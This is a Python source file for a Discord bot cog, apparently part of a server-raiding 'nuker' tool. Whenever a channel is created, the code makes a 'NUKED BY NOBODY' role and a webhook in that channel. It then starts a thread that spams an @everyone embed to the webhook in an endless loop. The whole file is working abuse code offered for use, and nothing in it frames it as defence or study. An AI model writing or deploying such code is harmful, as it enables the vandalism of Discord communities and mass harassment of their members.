from discord.ext import commands
import requests, discord
from threading import Thread
from colorama import Fore

def spam1(url):
	data = {
		"content" : "@everyone",
	}
	data["embeds"] = [
		{
			"description" : "GET NUKED WHOS GOING TO BELIEVE YOU",
			"title" : "𝐍𝐔𝐊𝐄𝐃 𝐁𝐘 𝐍𝐎𝐁𝐎𝐃𝐘",
			"color" : 0xff0000
		}
	]
	try:
		while 1:
			send = requests.post(url, json = data)
			send.raise_for_status()
	except:print(f"{Fore.RED}[-] Webhook spam unavailable")
	else:print((f"{Fore.LIGHTGREEN_EX}[+] Webhook spamming"))


class nukeCreateChannel(commands.Cog):
	def __init__(self,client):
		self.client=client
	
	@commands.Cog.listener()
	async def on_guild_channel_create(self,channel):
		try:
			guild = channel.guild
			await guild.create_role(
				name = "𝐍𝐔𝐊𝐄𝐃 𝐁𝐘 𝐍𝐎𝐁𝐎𝐃𝐘",
				colour = discord.Colour(0xff0000)
			)
			print(f"{Fore.LIGHTGREEN_EX}[+] Role created")
		except:print(f"{Fore.RED}[-] Role cannot be created")
		try:
			webhook = await channel.create_webhook(name = "𝐍𝐔𝐊𝐄𝐃 𝐁𝐘 𝐍𝐎𝐁𝐎𝐃𝐘")
			print(f"{Fore.LIGHTGREEN_EX}[+] Webhook created")
		except:
			print(f"{Fore.RED}[-] Webhook cannot be created")
		Thread(target=spam1, args=(webhook.url,)).start()

async def setup(client):
	await client.add_cog(nukeCreateChannel(client))